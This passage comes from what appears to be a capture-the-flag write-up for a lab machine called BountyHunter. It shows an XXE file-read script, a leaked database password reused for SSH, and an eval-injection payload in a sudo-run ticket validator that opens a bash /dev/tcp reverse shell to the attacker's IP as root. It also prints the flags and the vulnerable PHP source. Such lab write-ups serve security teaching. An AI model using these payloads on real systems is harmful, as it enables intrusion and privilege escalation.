res <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post(url, verify<span style="color:#ff79c6">=</span><span style="color:#ff79c6">False</span>, data<span style="color:#ff79c6">=</span>params, headers<span style="color:#ff79c6">=</span>headers)

soup <span style="color:#ff79c6">=</span> BeautifulSoup(res<span style="color:#ff79c6">.</span>text, <span style="color:#f1fa8c">&#39;lxml&#39;</span>)
entity <span style="color:#ff79c6">=</span> soup<span style="color:#ff79c6">.</span>find_all(<span style="color:#f1fa8c">&#39;td&#39;</span>)[<span style="color:#bd93f9">1</span>]
<span style="color:#8be9fd;font-style:italic">print</span>(entity<span style="color:#ff79c6">.</span>text)
</code></pre></td></tr></table>
</div>
</div><p>We can capture back our traffic:</p>
<pre><code>python3 xxe.py http://10.10.14.51
───────────────────────────────────────────────────────────────────────────────
$ sudo tcpdump -i eth0 'port 80'
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
10:55:26.928966 IP 014202efa8c8.39544 &gt; 10.10.11.100.http: Flags [S], seq 1283438392, win 64240, options [mss 1460,sackOK,TS val 1512709332 ecr 0,nop,wscale 7], length 0
10:55:26.976137 IP 10.10.11.100.http &gt; 014202efa8c8.39544: Flags [S.], seq 452884177, ack 1283438393, win 65535, options [mss 1460,wscale 2,eol], length 0
10:55:26.976333 IP 014202efa8c8.39544 &gt; 10.10.11.100.http: Flags [.], ack 1, win 502, length 0
10:55:26.976564 IP 014202efa8c8.39544 &gt; 10.10.11.100.http: Flags [P.], seq 1:254, ack 1, win 502, length 253: HTTP: POST /tracker_diRbPr00f314.php HTTP/1.1
10:55:26.976765 IP 014202efa8c8.39544 &gt; 10.10.11.100.http: Flags [P.], seq 254:589, ack 1, win 502, length 335: HTTP
10:55:26.976961 IP 10.10.11.100.http &gt; 014202efa8c8.39544: Flags [.], ack 254, win 65535, length 0
10:55:26.977104 IP 10.10.11.100.http &gt; 014202efa8c8.39544: Flags [.], ack 589, win 65535, length 0
10:55:27.113853 IP 172.19.0.1.61842 &gt; 014202efa8c8.http: Flags [S], seq 200090630, win 64240, options [mss 1460,sackOK,TS val 3729050258 ecr 0,nop,wscale 7], length 0
10:55:27.113930 IP 014202efa8c8.http &gt; 172.19.0.1.61842: Flags [R.], seq 0, ack 200090631, win 0, length 0
10:55:27.169757 IP 10.10.11.100.http &gt; 014202efa8c8.39544: Flags [P.], seq 1:369, ack 589, win 65535, length 368: HTTP: HTTP/1.1 200 OK
10:55:27.169809 IP 014202efa8c8.39544 &gt; 10.10.11.100.http: Flags [.], ack 369, win 501, length 0
10:55:27.172679 IP 014202efa8c8.39544 &gt; 10.10.11.100.http: Flags [F.], seq 589, ack 369, win 501, length 0
10:55:27.173201 IP 10.10.11.100.http &gt; 014202efa8c8.39544: Flags [.], ack 590, win 65535, length 0
10:55:27.219130 IP 10.10.11.100.http &gt; 014202efa8c8.39544: Flags [F.], seq 369, ack 590, win 65535, length 0
10:55:27.219192 IP 014202efa8c8.39544 &gt; 10.10.11.100.http: Flags [.], ack 370, win 501, length 0
</code></pre>
<p>our python script works well to fetch file as well:</p>
<pre><code>python3 xxe.py file:///etc/passwd
python3 xxe.py /etc/passwd
</code></pre>
<p>We are successful to fetch base64 encoded php files to find secrets:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">python3 xxe<span style="color:#ff79c6">.</span>py <span style="color:#ff79c6">/</span><span style="color:#ff79c6">var</span><span style="color:#ff79c6">/</span>www<span style="color:#ff79c6">/</span>html<span style="color:#ff79c6">/</span>db<span style="color:#ff79c6">.</span>php <span style="color:#ff79c6">|</span> base64 <span style="color:#ff79c6">-</span>d
<span style="color:#ff79c6">&lt;?</span>php
<span style="color:#6272a4">// TODO -&gt; Implement login system with the database.
</span><span style="color:#6272a4"></span><span style="color:#8be9fd;font-style:italic">$dbserver</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;localhost&#34;</span>;
<span style="color:#8be9fd;font-style:italic">$dbname</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;bounty&#34;</span>;
<span style="color:#8be9fd;font-style:italic">$dbusername</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;admin&#34;</span>;
<span style="color:#8be9fd;font-style:italic">$dbpassword</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;m19RoAU0hP41A1sTsq6K&#34;</span>;
<span style="color:#8be9fd;font-style:italic">$tes</span>
</code></pre></td></tr></table>
</div>
</div><p>We can successfully ssh with this password:</p>
<pre><code>ssh development@10.10.11.100
development@bountyhunter:~ sudo -l
</code></pre>
<h2 id="privesc">PrivESC</h2>
<p>let&rsquo;s explore sudoers permissions:</p>
<pre><code>development@bountyhunter:~ sudo -l
[..]
(root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
</code></pre>
<p>This python script will open a specified markdown file and will <code>evaluate</code> rows starting with <strong>**</strong> under certain conditions:</p>
<ul>
<li>row 0 is <strong># Skytrain Inc</strong></li>
<li>row 1 starts with <strong>## Ticket to &ldquo;</strong></li>
<li>code_line = i which is only possible on the next loop iteration after a row starting with *<strong>*Ticket Code:**</strong></li>
<li>evaluated rows should starts with <strong>**<!-- raw HTML omitted -->+whatever after the plus will be evaluated as well</strong></li>
<li>the <!-- raw HTML omitted --> % 7 == 4 (e.g 4, 11, 18, 25 &hellip;)</li>
</ul>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#Skytrain Inc Ticket Validation System 0.1</span>
<span style="color:#6272a4">#Do not distribute this file.</span>

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">load_file</span>(loc):
    <span style="color:#ff79c6">if</span> loc<span style="color:#ff79c6">.</span>endswith(<span style="color:#f1fa8c">&#34;.md&#34;</span>):
        <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">open</span>(loc, <span style="color:#f1fa8c">&#39;r&#39;</span>)
    <span style="color:#ff79c6">else</span>:
        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Wrong file type.&#34;</span>)
        exit()

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">evaluate</span>(ticketFile):
    <span style="color:#6272a4">#Evaluates a ticket to check for ireggularities.</span>
    code_line <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">None</span>
    <span style="color:#ff79c6">for</span> i,x <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">enumerate</span>(ticketFile<span style="color:#ff79c6">.</span>readlines()):
        <span style="color:#ff79c6">if</span> i <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>:
            <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> x<span style="color:#ff79c6">.</span>startswith(<span style="color:#f1fa8c">&#34;# Skytrain Inc&#34;</span>):
                <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>
            <span style="color:#ff79c6">continue</span>
        <span style="color:#ff79c6">if</span> i <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">1</span>:
            <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> x<span style="color:#ff79c6">.</span>startswith(<span style="color:#f1fa8c">&#34;## Ticket to &#34;</span>):
                <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>
            <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;Destination: </span><span style="color:#f1fa8c">{</span><span style="color:#f1fa8c">&#39; &#39;</span><span style="color:#ff79c6">.</span>join(x<span style="color:#ff79c6">.</span>strip()<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#39; &#39;</span>)[<span style="color:#bd93f9">3</span>:])<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
            <span style="color:#ff79c6">continue</span>

        <span style="color:#ff79c6">if</span> x<span style="color:#ff79c6">.</span>startswith(<span style="color:#f1fa8c">&#34;__Ticket Code:__&#34;</span>):
            code_line <span style="color:#ff79c6">=</span> i<span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>
            <span style="color:#ff79c6">continue</span>

        <span style="color:#ff79c6">if</span> code_line <span style="color:#ff79c6">and</span> i <span style="color:#ff79c6">==</span> code_line:
            <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> x<span style="color:#ff79c6">.</span>startswith(<span style="color:#f1fa8c">&#34;**&#34;</span>):
                <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>
            ticketCode <span style="color:#ff79c6">=</span> x<span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">&#34;**&#34;</span>, <span style="color:#f1fa8c">&#34;&#34;</span>)<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#34;+&#34;</span>)[<span style="color:#bd93f9">0</span>]
            <span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">int</span>(ticketCode) <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">7</span> <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">4</span>:
                validationNumber <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">eval</span>(x<span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">&#34;**&#34;</span>, <span style="color:#f1fa8c">&#34;&#34;</span>))
                <span style="color:#ff79c6">if</span> validationNumber <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">100</span>:
                    <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">True</span>
                <span style="color:#ff79c6">else</span>:
                    <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>
    <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">main</span>():
    fileName <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">input</span>(<span style="color:#f1fa8c">&#34;Please enter the path to the ticket file.</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>)
    ticket <span style="color:#ff79c6">=</span> load_file(fileName)
    <span style="color:#6272a4">#DEBUG print(ticket)</span>
    result <span style="color:#ff79c6">=</span> evaluate(ticket)
    <span style="color:#ff79c6">if</span> (result):
        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Valid ticket.&#34;</span>)
    <span style="color:#ff79c6">else</span>:
        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Invalid ticket.&#34;</span>)
    ticket<span style="color:#ff79c6">.</span>close

main()
</code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s craft a markdown file exploit.md that will be evaluated:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-markdown" data-lang="markdown"><span style="font-weight:bold"># Skytrain Inc
</span><span style="font-weight:bold"></span>
<span style="font-weight:bold">## Ticket to Privesc
</span><span style="font-weight:bold"></span>
**Ticket Code:**
\*\*4+100
</code></pre></td></tr></table>
</div>
</div><p>and execute the locally to test our exploit script:</p>
<pre><code>python3 ticketValidator.py
Please enter the path to the ticket file.
./exploit.md
Destination: Privesc
Valid ticket
</code></pre>
<p>Let&rsquo;s modify our markdown to exploit the eval vulnerability and try to get an icmp echo reply back to us:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-markdown" data-lang="markdown"><span style="font-weight:bold"># Skytrain Inc
</span><span style="font-weight:bold"></span>
<span style="font-weight:bold">## Ticket to Privesc
</span><span style="font-weight:bold"></span>
**Ticket Code:**
\*\*4+**import**(&#39;os&#39;).system(&#39;ping -c 1 10.10.14.51&#39;)
</code></pre></td></tr></table>
</div>
</div><p>and we have a ping back :)</p>
<pre><code>python3 ticketValidator.py
Please enter the path to the ticket file.
./exploit.md
Destination: Privesc
PING 10.10.11.100 (10.10.11.100) 56(84) bytes of data.

--- 10.10.11.100 ping statistics ---
1 packets transmitted, 0 received, 100% packet loss, time 0ms

Valid ticket
───────────────────────────────────────────────────────────────────────────
$ sudo tcpdump -nni eth0 icmp
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
14:44:41.393123 IP 172.19.0.2 &gt; 10.10.11.100: ICMP echo request, id 3180, seq 1, length 64
</code></pre>
<p>Time to get a reverse shell as root:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#6272a4"># Skytrain Inc</span>
<span style="color:#6272a4">## Ticket to Privesc</span>
__Ticket Code:__
**4+__import__<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;os&#39;</span><span style="color:#ff79c6">)</span>.system<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.51/80 0&gt;&amp;1&#34;&#39;</span><span style="color:#ff79c6">)</span>
</code></pre></td></tr></table>
</div>
</div><p>We get a reverse shell:</p>
<p>development@bountyhunter:/dev/shm$ vim exploit.md
development@bountyhunter:/dev/shm$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
./exploit.md
Destination: Privesc
────────────────────────────────────────────────────────────
rlwrap nc -lnvp 80
Listening on 0.0.0.0 80
Connection received on 172.19.0.1 62264
root@bountyhunter:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root)
root@bountyhunter:~# cat /root/root.txt
a4cfc0713b536b442abd250173a2f138
root@bountyhunter:~# cat /home/development/user.txt
206ff97df673b73fd8333f8581e36025</p>
<h2 id="explore-the-vulnerabilities">Explore the vulnerabilities:</h2>
<p>The XXE vulnerability is visible in row 6.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">python3 xxe<span style="color:#ff79c6">.</span>py <span style="color:#ff79c6">/</span><span style="color:#ff79c6">var</span><span style="color:#ff79c6">/</span>www<span style="color:#ff79c6">/</span>html<span style="color:#ff79c6">/</span>tracker_diRbPr00f314<span style="color:#ff79c6">.</span>php <span style="color:#ff79c6">|</span> base64 <span style="color:#ff79c6">-</span>d
<span style="color:#ff79c6">&lt;?</span>php

<span style="color:#ff79c6">if</span>(isset(<span style="color:#8be9fd;font-style:italic">$_POST</span>[<span style="color:#f1fa8c">&#39;data&#39;</span>])) {
<span style="color:#8be9fd;font-style:italic">$xml</span> <span style="color:#ff79c6">=</span> base64_decode(<span style="color:#8be9fd;font-style:italic">$_POST</span>[<span style="color:#f1fa8c">&#39;data&#39;</span>]);
libxml_disable_entity_loader(<span style="color:#ff79c6">false</span>);
<span style="color:#8be9fd;font-style:italic">$dom</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> DOMDocument();
<span style="color:#8be9fd;font-style:italic">$dom</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">loadXML</span>(<span style="color:#8be9fd;font-style:italic">$xml</span>, LIBXML_NOENT <span style="color:#ff79c6">|</span> LIBXML_DTDLOAD);
<span style="color:#8be9fd;font-style:italic">$bugreport</span> <span style="color:#ff79c6">=</span> simplexml_import_dom(<span style="color:#8be9fd;font-style:italic">$dom</span>);
}
<span style="color:#ff79c6">?&gt;</span>
If DB were ready, would have added:
&lt;table&gt;
  &lt;tr&gt;
    &lt;td&gt;Title:&lt;/td&gt;
    &lt;td&gt;&lt;?php echo $bugreport-&gt;title; ?&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;CWE:&lt;/td&gt;
    &lt;td&gt;&lt;?php echo $bugreport-&gt;cwe; ?&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Score:&lt;/td&gt;
    &lt;td&gt;&lt;?php echo $bugreport-&gt;cvss; ?&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Reward:&lt;/td&gt;
    &lt;td&gt;&lt;?php echo $bugreport-&gt;reward; ?&gt;&lt;/td&gt;
  &lt;/tr&gt;
&lt;/table&gt;
</code></pre></td></tr></table>
</div>
